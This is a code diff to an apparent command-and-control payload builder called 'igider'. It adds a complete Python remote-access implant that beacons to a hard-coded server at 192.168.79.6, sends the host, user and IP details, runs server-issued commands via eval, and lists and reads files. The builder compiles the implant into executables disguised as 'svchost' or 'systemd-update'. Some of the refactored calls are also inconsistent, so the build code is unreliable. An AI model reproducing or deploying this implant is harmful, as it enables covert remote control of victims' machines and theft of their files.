@@ -15,7 +15,10 @@ from typing import Dict, Any, List, Optional
 from itertools import cycle
 import datetime
 import textwrap
-
+import tempfile
+import subprocess
+import sys
+import shutil
 
 class Igider(PayloadType):
     name = "igider"
@@ -119,6 +122,10 @@ class Igider(PayloadType):
     
     def _create_pyinstaller_spec(self, code: str, target_os: str) -> str:
         """Generate PyInstaller spec file for executable creation."""
+        exe_name = "svchost" if target_os == "windows" else "systemd-update"
+        console_mode = "False" if target_os == "windows" else "True"
+        # Remove icon requirement to avoid file not found error
+        icon_line = ''
         spec_content = textwrap.dedent(f"""
             # -*- mode: python ; coding: utf-8 -*-
 
@@ -222,16 +229,11 @@ class Igider(PayloadType):
 
     
 
-    async def _build_executable(self, code: str, target_os: str) -> bytes:
-        """Build executable using PyInstaller."""
-        import tempfile
-        import subprocess
-        import shutil
-        import sys
-        
+    def _build_executable(code: str, target_os: str) -> bytes:
+    
         # Check if PyInstaller is available
         try:
-            subprocess.run(["pyinstaller", "--version"], capture_output=True, check=True)
+            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, check=True)
         except (subprocess.CalledProcessError, FileNotFoundError):
             raise Exception("PyInstaller is not installed or not available in PATH")
         
@@ -241,20 +243,21 @@ class Igider(PayloadType):
             with open(main_py, "w") as f:
                 f.write(code)
             
+            # Create a basic icon file if needed (optional)
+            # For now, we'll skip the icon to avoid complexity
+            
             # Create spec file
-            spec_content = self._create_pyinstaller_spec(code, target_os)
+            spec_content = _create_pyinstaller_spec(code, target_os)
             spec_file = os.path.join(temp_dir, "build.spec")
             with open(spec_file, "w") as f:
                 f.write(spec_content)
             
             try:
                 # Run PyInstaller with proper arguments
-                cmd = [
-                    "pyinstaller", 
-                    spec_file
-                ]
+                cmd = [sys.executable, "-m", "PyInstaller", spec_file]
+
                 
-                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
+                logger.info(f"Running PyInstaller: {' '.join(cmd)}")
                 result = subprocess.run(
                     cmd, 
                     capture_output=True, 
@@ -264,8 +267,8 @@ class Igider(PayloadType):
                 )
                 
                 if result.returncode != 0:
-                    self.logger.error(f"PyInstaller stdout: {result.stdout}")
-                    self.logger.error(f"PyInstaller stderr: {result.stderr}")
+                    logger.error(f"PyInstaller stdout: {result.stdout}")
+                    logger.error(f"PyInstaller stderr: {result.stderr}")
                     raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
                 
                 # Find the generated executable in the correct location
@@ -281,7 +284,7 @@ class Igider(PayloadType):
                         files = [f for f in os.listdir(dist_dir) if os.path.isfile(os.path.join(dist_dir, f))]
                         if files:
                             exe_path = os.path.join(dist_dir, files[0])
-                            self.logger.info(f"Using fallback executable: {exe_path}")
+                            logger.info(f"Using fallback executable: {exe_path}")
                         else:
                             raise Exception(f"No executable found in {dist_dir}")
                     else:
@@ -294,14 +297,330 @@ class Igider(PayloadType):
                 with open(exe_path, "rb") as f:
                     executable_data = f.read()
                     
-                self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
+                logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
                 return executable_data
                     
             except subprocess.TimeoutExpired:
                 raise Exception("PyInstaller build timed out after 5 minutes")
             except Exception as e:
-                self.logger.error(f"Executable build failed: {e}")
+                logger.error(f"Executable build failed: {e}")
                 raise Exception(f"Failed to build executable: {str(e)}")
+            
+    code_ex = """
+    import os, random, sys, json, socket, base64, time, platform, ssl, getpass
+    import urllib.request
+    from datetime import datetime
+    import threading, queue
+
+    CHUNK_SIZE = 51200
+
+    class igider:
+        def getOSVersion(self):
+            if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
+            else: return platform.system() + " " + platform.release()
+
+    
+        def getUsername(self):
+            try: return getpass.getuser()
+            except: pass
+            for k in [ "USER", "LOGNAME", "USERNAME" ]: 
+                if k in os.environ.keys(): return os.environ[k]
+                
+        
+        def formatMessage(self, data, urlsafe=False):
+            output = base64.b64encode(self.agent_config["UUID"].encode() + json.dumps(data).encode())
+            if urlsafe: 
+                output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + json.dumps(data).encode())
+            return output
+
+        
+        def formatResponse(self, data):
+            decoded_data = data.decode('utf-8')
+            json_data = decoded_data.replace(self.agent_config["UUID"], "")
+            return json.loads(json_data)
+
+        
+        def postMessageAndRetrieveResponse(self, data):
+            return self.formatResponse(self.makeRequest(self.formatMessage(data),'POST'))
+
+        
+        def getMessageAndRetrieveResponse(self, data):
+            return self.formatResponse(self.makeRequest(self.formatMessage(data, True)))
+
+        
+        def sendTaskOutputUpdate(self, task_id, output):
+            responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
+            message = { "action": "post_response", "responses": responses }
+            response_data = self.postMessageAndRetrieveResponse(message)
+
+        
+        def postResponses(self):
+            try:
+                responses = []
+                socks = []
+                taskings = self.taskings
+                for task in taskings:
+                    if task["completed"] == True:
+                        out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
+                        if task["error"]: out["status"] = "error"
+                        for func in ["processes", "file_browser"]: 
+                            if func in task: out[func] = task[func]
+                        responses.append(out)
+                while not self.socks_out.empty(): socks.append(self.socks_out.get())
+                if ((len(responses) > 0) or (len(socks) > 0)):
+                    message = { "action": "post_response", "responses": responses }
+                    if socks: message["socks"] = socks
+                    response_data = self.postMessageAndRetrieveResponse(message)
+                    for resp in response_data["responses"]:
+                        task_index = [t for t in self.taskings \
+                            if resp["task_id"] == t["task_id"] \
+                            and resp["status"] == "success"][0]
+                        self.taskings.pop(self.taskings.index(task_index))
+            except: pass
+
+    
+        def processTask(self, task):
+            try:
+                task["started"] = True
+                function = getattr(self, task["command"], None)
+                if(callable(function)):
+                    try:
+                        params = json.loads(task["parameters"]) if task["parameters"] else {}
+                        params['task_id'] = task["task_id"] 
+                        command =  "self." + task["command"] + "(**params)"
+                        output = eval(command)
+                    except Exception as error:
+                        output = str(error)
+                        task["error"] = True                        
+                    task["result"] = output
+                    task["completed"] = True
+                else:
+                    task["error"] = True
+                    task["completed"] = True
+                    task["result"] = "Function unavailable."
+            except Exception as error:
+                task["error"] = True
+                task["completed"] = True
+                task["result"] = error
+
+        
+        def processTaskings(self):
+            threads = list()       
+            taskings = self.taskings     
+            for task in taskings:
+                if task["started"] == False:
+                    x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
+                    threads.append(x)
+                    x.start()
+
+        
+        def getTaskings(self):
+            data = { "action": "get_tasking", "tasking_size": -1 }
+            tasking_data = self.getMessageAndRetrieveResponse(data)
+            for task in tasking_data["tasks"]:
+                t = {
+                    "task_id":task["id"],
+                    "command":task["command"],
+                    "parameters":task["parameters"],
+                    "result":"",
+                    "completed": False,
+                    "started":False,
+                    "error":False,
+                    "stopped":False
+                }
+                self.taskings.append(t)
+            if "socks" in tasking_data:
+                for packet in tasking_data["socks"]: self.socks_in.put(packet)
+
+        def checkIn(self):
+            hostname = socket.gethostname()
+            ip = ''
+            if hostname and len(hostname) > 0:
+                try:
+                    ip = socket.gethostbyname(hostname)
+                except:
+                    pass
+
+            data = {
+                "action": "checkin",
+                "ip": ip,
+                "os": self.getOSVersion(),
+                "user": self.getUsername(),
+                "host": hostname,
+                "domain": socket.getfqdn(),
+                "pid": os.getpid(),
+                "uuid": self.agent_config["PayloadUUID"],
+                "architecture": "x64" if sys.maxsize > 2**32 else "x86",
+                "encryption_key": self.agent_config["enc_key"]["enc_key"],
+                "decryption_key": self.agent_config["enc_key"]["dec_key"]
+            }
+            encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + json.dumps(data).encode())
+            decoded_data = self.makeRequest(encoded_data, 'POST')
+            try:
+                # Decode the bytes object to a string and parse as JSON
+                decoded_str = decoded_data.decode('utf-8')
+                parsed_data = json.loads(decoded_str.replace(self.agent_config["PayloadUUID"], ""))
+                if "status" in parsed_data:
+                    UUID = parsed_data["id"]
+                    self.agent_config["UUID"] = UUID
+                    return True
+                else:
+                    return False
+            except (json.JSONDecodeError, UnicodeDecodeError):
+                return False
+
+        def makeRequest(self, data, method='GET'):
+            hdrs = {}
+            for header in self.agent_config["Headers"]:
+                hdrs[header] = self.agent_config["Headers"][header]
+            if method == 'GET':
+                req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
+            else:
+                req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
+            
+            if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
+                tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
+                handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
+                if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
+                    proxy = urllib.request.ProxyHandler({
+                        "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
+                            self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
+                    })
+                    auth = urllib.request.HTTPBasicAuthHandler()
+                    opener = urllib.request.build_opener(proxy, auth, handler)
+                else:
+                    proxy = urllib.request.ProxyHandler({
+                        "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
+                    })
+                    opener = urllib.request.build_opener(proxy, handler)
+                urllib.request.install_opener(opener)
+            try:
+                with urllib.request.urlopen(req) as response:
+                    out = base64.b64decode(response.read())
+                    response.close()
+                    return out
+            except: return ""
+
+            
+        def passedKilldate(self):
+            kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
+            kd = datetime(kd_list[0], kd_list[1], kd_list[2])
+            if datetime.now() >= kd: return True
+            else: return False
+
+        
+        def agentSleep(self):
+            j = 0
+            if int(self.agent_config["Jitter"]) > 0:
+                v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
+                if int(v) > 0:
+                    j = random.randrange(0, int(v))    
+            time.sleep(self.agent_config["Sleep"]+j)
+
+        def ls(self, task_id, path, file_browser=False):
+            if path == ".": file_path = self.current_directory
+            else: file_path = path if path[0] == os.sep \
+                    else os.path.join(self.current_directory,path)
+            file_details = os.stat(file_path)
+            target_is_file = os.path.isfile(file_path)
+            target_name = os.path.basename(file_path.rstrip(os.sep)) if file_path != os.sep else os.sep
+            file_browser = {
+                "host": socket.gethostname(),
+                "is_file": target_is_file,
+                "permissions": {"octal": oct(file_details.st_mode)[-3:]},
+                "name": target_name if target_name not in [".", "" ] \
+                        else os.path.basename(self.current_directory.rstrip(os.sep)),        
+                "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)),
+                "success": True,
+                "access_time": int(file_details.st_atime * 1000),
+                "modify_time": int(file_details.st_mtime * 1000),
+                "size": file_details.st_size,
+                "update_deleted": True,
+            }
+            files = []
+            if not target_is_file:
+                with os.scandir(file_path) as entries:
+                    for entry in entries:
+                        file = {}
+                        file['name'] = entry.name
+                        file['is_file'] = True if entry.is_file() else False
+                        try:
+                            file_details = os.stat(os.path.join(file_path, entry.name))
+                            file["permissions"] = { "octal": oct(file_details.st_mode)[-3:]}
+                            file["access_time"] = int(file_details.st_atime * 1000)
+                            file["modify_time"] = int(file_details.st_mtime * 1000)
+                            file["size"] = file_details.st_size
+                        except OSError as e:
+                            pass
+                        files.append(file)  
+            file_browser["files"] = files
+            task = [task for task in self.taskings if task["task_id"] == task_id]
+            task[0]["file_browser"] = file_browser
+            output = { "files": files, "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)), "name":  target_name if target_name not in  [".", ""] \
+                        else os.path.basename(self.current_directory.rstrip(os.sep))  }
+            return json.dumps(output)
+
+        def cat(self, task_id, path):
+            file_path = path if path[0] == os.sep \
+                    else os.path.join(self.current_directory,path)
+            
+            with open(file_path, 'r') as f:
+                content = f.readlines()
+                return ''.join(content)
+
+        def exit(self, task_id):
+            os._exit(0)
+
+
+
+        
+        def __init__(self):
+            self.socks_open = {}
+            self.socks_in = queue.Queue()
+            self.socks_out = queue.Queue()
+            self.taskings = []
+            self._meta_cache = {}
+            self.moduleRepo = {}
+            self.current_directory = os.getcwd()
+            self.agent_config = {
+                "Server": "http://192.168.79.6",
+                "Port": "80",
+                "PostURI": "/data",
+                "PayloadUUID": "726cd894-9618-41f4-8878-0ea656c60257",
+                "UUID": "",
+                "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
+                "Sleep": 10,
+                "Jitter": 23,
+                "KillDate": "2026-05-23",
+                "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
+                "ExchChk": "True",
+                "GetURI": "/index",
+                "GetParam": "q",
+                "ProxyHost": "",
+                "ProxyUser": "",
+                "ProxyPass": "",
+                "ProxyPort": "",
+            }
+
+            while(True):
+                if(self.agent_config["UUID"] == ""):
+                    self.checkIn()
+                    self.agentSleep()
+                else:
+                    while(True):
+                        if self.passedKilldate():
+                            self.exit()
+                        try:
+                            self.getTaskings()
+                            self.processTaskings()
+                            self.postResponses()
+                        except: pass
+                        self.agentSleep()                   
+
+    if __name__ == "__main__":
+        igider = igider()
+
+    """
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
         resp = BuildResponse(status=BuildStatus.Success)
@@ -366,7 +685,7 @@ class Igider(PayloadType):
             if output_format == "exe_windows":
                 try:
                     await self.update_build_step("Finalizing Payload", "Building Windows executable...")
-                    executable_data = await self._build_executable(base_code, "windows")
+                    executable_data = await self._build_executable(self.code_ex, "windows")
                     resp.payload = executable_data
                     resp.updated_filename = (self.filename).split(".")[0] +".exe"
                     resp.build_message = "Successfully built Windows executable"
